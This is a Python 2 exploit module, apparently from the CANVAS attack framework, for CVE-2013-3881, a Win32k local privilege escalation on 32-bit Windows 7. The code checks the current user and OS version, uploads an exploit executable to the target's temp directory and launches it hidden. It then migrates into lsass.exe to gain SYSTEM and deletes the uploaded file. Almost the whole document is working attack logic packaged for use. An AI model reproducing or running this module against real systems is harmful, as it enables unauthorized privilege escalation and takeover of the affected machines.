#!/usr/bin/env python
import os
import sys

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *

NAME                           = 'Win32k NULL Page Exploit'
DESCRIPTION                    = 'A vulnerability in Win32k popup-menu handling routines allows a user to elevate privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = ''
DOCUMENTATION['CVE Name']      = 'CVE-2013-3881'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3881'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Windows']]
PROPERTY['VERSION']            = ['7']
PROPERTY['MS PATCHES']         = ["KB2862330",
                                  "KB2868038",
                                  "KB2862335",
                                  "KB2884256",
                                  "KB2876284",
                                  "KB2847311"]
DOCUMENTATION['Notes']         = """

This vulnerability only affects Intel x86 based versions of Windows 7

This module automatically migrates to lsass.exe . 

Tested on:
Windows 7 Ultimate N

"""

CHANGELOG = """
"""

targets={
    0: ['Autodetect',[0,0,0,0]]
}

from ExploitTypes.localexploit import LocalExploit

import random

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_name     = 'exp.exe'
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0,1000)
        self.isX64          = False
    
    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
    
    def init_exploit(self):
        """
        Uploads the exploit exe 
        """
        src = os.path.join(self.local_path, self.local_name)
        dst = os.path.join(self.remote_path, self.remote_name)
        
        try:
            self.node.shell.upload(src, destfilename = dst)
            self.log('[+] Uploaded %s to %s' % (src, dst))            
        except Exception, ex:
            self.log('Error: %s' % ex)
            self.log('[-] Could not upload %s to %s' % (src, dst))
            return False
            
        return True

    def uninit_exploit(self):
        """
        Remove the exploit exe
        """
        try:
            dst = self.remote_path + self.remote_name
            ret = self.node.shell.unlink(dst)
            self.log('[+] %s' % ret)
        except Exception, ex:
            self.log('Error: %s' % ex)
                
        return True

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            ret = self.node.shell.CreateProcessA(dst + ' ' +  arg1, 
                                                 inherithandles=1, 
                                                 dwCreationFlags = 0x08000000)
            if not ret: return False
        except Exception, ex:
            self.log('Error: %s' % ex)
            return False
        
        return True

    def cleanup(self):

        if not self.uninit_exploit():
            self.log('[-] Could not uninit %s' % NAME)
            self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.remote_name))
            return False

        return True 


    def run(self):
        self.get_args()

        if self.node.nodetype.lower() not in ['win32node']:
            self.log('[-] Node Type %s not supported ...' % self.node.nodetype)
            return False

        if self.node.shell.has_wow_64 and self.node.shell.IsWow64Process():
            self.log('[-] This exploit does not work on 64bit Windows')
            return False
    
        #first, we check to make sure we are not 
        #already local/SYSTEM - is there a better way?
        whoami = self.exploitnodes('whoami', [self.node])[0]
        
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret, nodeos = self.node.shell.GetVersionEx()
        minor = nodeos['Minor Version']
        major = nodeos['Major Version']
       

        if ((major != 6) or (minor != 1)):
            self.log('[-] Windows Version %d.%d not supported.' % (major, minor))
            return False

        self.log('Attacking Windows %d.%d' % (major,minor))

        self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # upload binaries
        if not self.init_exploit():
            self.log('[-] Could not init %s' % NAME)
            return False

        # spawn exploit
        pid = self.node.shell.getpid()
        arg1 = "%s" % pid
        
        if not self.spawn_exploit(arg1):
            self.log('[-] Could not spawn %s' % NAME)
            return False
             
        # Just do a default mosdefmigrate and be done with it
        migrate = self.engine.getModuleExploit("mosdefmigrate")
        migrate.link(self)
        ret = migrate.run()

        if ret:
            self.log('[+] %s succeeded ' % NAME)
            self.cleanup()
            return True
        else:
            self.log("Couldn't migrate, time to call it off.")
        
        time.sleep(1)
            
        self.cleanup()
        self.log('[-] %s failed ...' % NAME)
        return False

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)     
